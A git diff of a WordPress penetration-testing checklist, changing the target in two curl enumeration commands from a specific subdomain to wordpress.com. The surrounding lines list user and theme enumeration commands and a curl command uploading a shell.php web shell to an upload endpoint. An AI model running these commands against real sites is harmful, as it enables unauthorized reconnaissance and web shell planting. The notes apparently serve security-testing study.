@@ -115,7 +115,7 @@ echo "<pre>$output</pre>";
 - [x] __Check for the `changelog.txt` or `CHANGELOG.txt`__
 - [x] __wpscan --url <url>__
 
-  - __`curl -s -I -X GET https://vishwa747.wordpress.com/wp-json/wp/v2/users`__
+  - __`curl -s -I -X GET https://wordpress.com/wp-json/wp/v2/users`__
 
 
 
@@ -126,7 +126,7 @@ echo "<pre>$output</pre>";
 - [ ] __3. Theme Enumeration__
   - __`curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/themes' | sed -E 's, href=|src=, THIIIIS,g' | awk -F "THIIIIS" '{print$2}' | cut -d "'" -f2`__
 - [ ] __4. User Enum__
-  - __`curl -s -I -X GET https://vishwa747.wordpress.com/?author=1`__
+  - __`curl -s -I -X GET https://wordpress.com/?author=1`__
   - __Checking if the root user exists: If you receive a 200 OK root is there or try to change the number__
 - __`<url>/wp-content/uploads`__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
